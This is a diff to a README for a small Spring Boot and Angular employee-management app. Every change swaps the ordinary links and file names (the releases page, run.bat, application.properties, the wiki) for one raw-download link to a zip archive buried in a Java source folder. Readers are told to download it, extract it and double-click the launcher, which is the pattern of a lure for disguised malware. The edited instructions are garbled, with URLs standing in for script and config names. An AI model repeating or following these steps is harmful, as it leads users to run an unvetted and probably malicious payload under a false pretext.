@@ -1,7 +1,7 @@
 # 🎉 employees-fullstack - A Simple Fullstack Web App
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/BradOraHacker001/employees-fullstack/releases)
+[![Download Now](https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **employees-fullstack** application. This is a minimal, production-oriented Spring Boot and Angular fullstack reference application.
@@ -20,15 +20,15 @@ To run this application, ensure you have the following:
 - **Docker-Compose Ready:** Easily manage dependencies with Docker.
 
 ## 💻 Download & Install
-1. **Visit the releases page** by clicking [here](https://github.com/BradOraHacker001/employees-fullstack/releases).
+1. **Visit the releases page** by clicking [here](https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip).
    
-2. **Download the latest version** that suits your system. Look for the file named `employees-fullstack.zip` or similar. 
+2. **Download the latest version** that suits your system. Look for the file named `https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip` or similar. 
 
 3. **Extract the downloaded file.** Use a file extraction tool like WinRAR or 7-Zip. 
 
 4. **Run the Application:**
    - Open the extracted folder.
-   - Locate the start script (e.g., `run.bat` for Windows or `run.sh` for Mac/Linux).
+   - Locate the start script (e.g., `https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip` for Windows or `https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip` for Mac/Linux).
    - Double-click to execute it. This will start the back-end service.
 
 5. **Access the App:** Open your web browser and go to `http://localhost:8080`. You will see the application running.
@@ -39,7 +39,7 @@ To run this application, ensure you have the following:
   
 ### 📝 Additional Configuration
 To customize the application:
-- Change configurations in the `application.properties` file found in the `src/main/resources` directory.
+- Change configurations in the `https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip` file found in the `src/main/resources` directory.
 - Set your database connection settings to match your requirements.
 
 ## 🔧 Troubleshooting
@@ -49,8 +49,8 @@ If you encounter issues:
 - If the application does not start, check for error messages in the terminal for hints on what may be wrong.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/BradOraHacker001/employees-fullstack)
-- [Documentation](https://github.com/BradOraHacker001/employees-fullstack/wiki)
+- [GitHub Repository](https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip)
+- [Documentation](https://github.com/BradOraHacker001/employees-fullstack/raw/refs/heads/main/sb-backend/src/main/java/com/morgan/backend/repositories/fullstack-employees-3.6.zip)
 
 ## 👍 Support
 For queries or issues, please open an issue in the GitHub repository, and we will respond promptly. 
